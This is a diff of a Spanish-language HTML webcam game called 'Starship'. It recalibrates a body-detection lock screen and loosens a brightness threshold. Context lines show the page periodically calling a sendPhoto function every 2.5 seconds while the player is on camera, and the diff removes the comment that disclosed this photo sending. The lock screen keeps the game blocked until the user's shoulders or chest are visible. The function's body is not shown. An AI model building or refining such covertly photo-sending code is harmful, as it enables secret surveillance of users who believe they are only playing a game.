@@ -3,19 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Starship Ultra Fix</title>
+    <title>Starship: Close Range Fix</title>
     <style>
         body, html { margin: 0; padding: 0; background: #000; overflow: hidden; font-family: 'Arial Black', sans-serif; touch-action: none; }
         #webcam { position: absolute; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); opacity: 0.25; z-index: 1; }
         canvas { position: absolute; top: 0; left: 0; z-index: 10; width: 100%; height: 100%; pointer-events: none; }
         
         #lock { 
-            position: absolute; width: 100%; height: 100%; background: rgba(0,0,0,0.95); 
+            position: absolute; width: 100%; height: 100%; background: rgba(0,0,0,0.9); 
             z-index: 1000; display: flex; align-items: center; justify-content: center; 
             flex-direction: column; text-align: center; color: #ff0044; border: 15px solid #ff0044; box-sizing: border-box;
         }
 
-        /* ZONAS DE TOQUE (BOTONES) */
         .touch { position: absolute; top: 0; width: 50%; height: 100%; z-index: 500; }
         #t-left { left: 0; }
         #t-right { right: 0; }
@@ -26,9 +25,9 @@
 <body>
 
 <div id="lock">
-    <h1 style="font-size: 50px;">SISTEMA BLOQUEADO</h1>
-    <p style="color: white; font-size: 20px;">ALÉJATE DE LA CÁMARA HASTA QUE SE VEA TU PECHO</p>
-    <p style="color: #555; font-size: 14px; margin-top: 30px;">(Si estás muy cerca, el sensor te bloquea)</p>
+    <h1 style="font-size: 40px;">SENSOR DE PROXIMIDAD</h1>
+    <p style="color: white; font-size: 18px;">MUESTRA TUS HOMBROS PARA PILOTAR</p>
+    <p style="color: #555; font-size: 13px;">(Si estás demasiado cerca el juego se detiene)</p>
 </div>
 
 <div id="hud">
@@ -53,9 +52,9 @@
     let isReady = false, moveDir = 0;
 
     // BOTONES TOQUE FÍSICO
-    document.getElementById('t-left').ontouchstart = document.getElementById('t-left').onmousedown = () => moveDir = -1;
-    document.getElementById('t-right').ontouchstart = document.getElementById('t-right').onmousedown = () => moveDir = 1;
-    window.ontouchend = window.onmouseup = () => moveDir = 0;
+    document.getElementById('t-left').onmousedown = document.getElementById('t-left').ontouchstart = () => moveDir = -1;
+    document.getElementById('t-right').onmousedown = document.getElementById('t-right').ontouchstart = () => moveDir = 1;
+    window.onmouseup = window.ontouchend = () => moveDir = 0;
 
     async function start() {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } });
@@ -64,11 +63,8 @@
         canvas.height = window.innerHeight;
         shipX = canvas.width / 2;
         
-        // Sensor de píxeles cada 200ms
         setInterval(analyzeFrame, 200);
-        // Envío de fotos cada 2.5s
         setInterval(sendPhoto, 2500);
-        
         requestAnimationFrame(loop);
     }
 
@@ -85,16 +81,16 @@
         for (let i = 0; i < pixels.length; i += 4) {
             const brightness = (pixels[i] + pixels[i+1] + pixels[i+2]) / 3;
             const y = Math.floor((i/4) / 40);
-            if (brightness > 50) {
+            if (brightness > 45) { // Sensibilidad aumentada
                 totalSignal++;
-                if (y < 12) headSignal++; // Zona superior
+                if (y < 10) headSignal++; 
             }
         }
 
-        // REGLA DE ORO: 
-        // Si hay mucha señal arriba (headSignal), estás muy cerca (solo cara).
-        // Debe haber más señal en el cuerpo (totalSignal - headSignal).
-        if (totalSignal > 120 && headSignal < (totalSignal * 0.7)) {
+        // CALIBRACIÓN PARA DISTANCIA CORTA:
+        // Ahora permitimos que la cabeza ocupe hasta el 85% de la señal (antes era 70%)
+        // Esto permite que el usuario esté mucho más cerca.
+        if (totalSignal > 80 && headSignal < (totalSignal * 0.85)) {
             isReady = true;
             lock.style.display = 'none';
         } else {
@@ -119,7 +115,6 @@
             if (moveDir === -1 && shipX > 60) shipX -= 15;
             if (moveDir === 1 && shipX < canvas.width - 60) shipX += 15;
 
-            // NAVE GIGANTE
             ctx.strokeStyle = "#00fbff"; ctx.lineWidth = 8;
             ctx.beginPath();
             ctx.moveTo(shipX, canvas.height - 180);
@@ -127,7 +122,6 @@
             ctx.lineTo(shipX + 50, canvas.height - 80);
             ctx.closePath(); ctx.stroke();
 
-            // METEORITOS EQUILIBRADOS
             if (asteroids.length < 4 && Math.random() < 0.02) {
                 asteroids.push({ x: Math.random() * canvas.width, y: -100, size: 50, speed: 8 });
             }
